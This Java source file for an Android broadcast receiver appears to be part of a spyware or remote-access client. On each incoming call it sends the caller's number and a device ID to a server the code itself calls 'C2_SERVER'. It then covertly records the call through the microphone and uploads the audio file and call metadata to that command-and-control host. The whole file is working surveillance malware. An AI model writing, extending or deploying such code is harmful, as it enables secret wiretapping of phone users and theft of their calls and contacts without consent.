package com.ot.grhq.client.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.Utils;

import org.json.JSONObject;

import java.io.File;

/**
 * Phone call broadcast receiver
 */
public class Call extends BroadcastReceiver {

    private static MediaRecorder recorder = new MediaRecorder();

    private static File audiofile = null;

    private static String incomingNumber;

    private static boolean isRecording = false;
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.intent.action.PHONE_STATE")) {
            // Get the phone state from the intent
            String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

            if (phoneState != null) {
                if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                    // Incoming call is ringing
                    incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

                    String formData = "id=" + Utils.clientID(context);
                    formData += "&type=client";
                    formData += "&res=incoming_call";
                    formData += "&number=" + incomingNumber;
                    formData += "&timestamp=" + System.currentTimeMillis();

                    new NotifyC2(Utils.C2_SERVER + "/uploadLog", formData, result -> {

                    }).execute();

                } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                    // Call is in progress (either incoming or outgoing)
                    //Creating file
                    File dir = Environment.getExternalStorageDirectory();
                    try {
                        audiofile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".3gp", dir);

                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        recorder.setOutputFile(audiofile.getAbsolutePath());
                        recorder.prepare();
                        recorder.start();
                        isRecording = true;
                    } catch (Exception e) {}

                } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                    // Call has ended
                    if (isRecording)
                        recorder.stop();
                    recorder.reset();
                    recorder.release();
                    isRecording = false;

                    FileManager.uploadFile(audiofile.getPath(), Utils.C2_SERVER + "/recording");

                    String formData = "id=" + Utils.clientID(context);
                    formData += "&type=client";
                    formData += "&res=recording";
                    formData += "&number=" + incomingNumber;
                    formData += "&filename=" + audiofile.getName();
                    formData += "&timestamp=" + System.currentTimeMillis();

                    new NotifyC2(Utils.C2_SERVER + "/uploadRecording", formData, result -> {

                    }).execute();
                }
            }
        }
    }
}

